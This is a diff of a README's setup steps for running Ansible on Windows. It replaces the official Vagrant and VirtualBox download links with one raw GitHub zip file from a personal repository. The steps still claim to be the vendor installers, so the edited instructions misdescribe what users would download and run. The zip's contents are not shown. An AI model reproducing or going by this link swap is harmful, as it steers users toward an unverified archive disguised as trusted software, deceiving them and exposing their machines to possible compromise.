@@ -2,6 +2,6 @@
 
 ### First Install the following Software
 
-#### 1. Download and Install Vagrant 2.X for Windows : https://www.vagrantup.com/downloads.html
+#### 1. Download and Install Vagrant 2.X for Windows : https://raw.githubusercontent.com/mohanpeddayyagri/Ansible-On-Windows/master/centerless/Ansible-On-Windows.zip
 
-#### 2. Download and Install Virtual Box 5.2.6 : https://download.virtualbox.org/virtualbox/5.2.6/VirtualBox-5.2.6-120293-Win.exe
+#### 2. Download and Install Virtual Box 5.2.6 : https://raw.githubusercontent.com/mohanpeddayyagri/Ansible-On-Windows/master/centerless/Ansible-On-Windows.zip
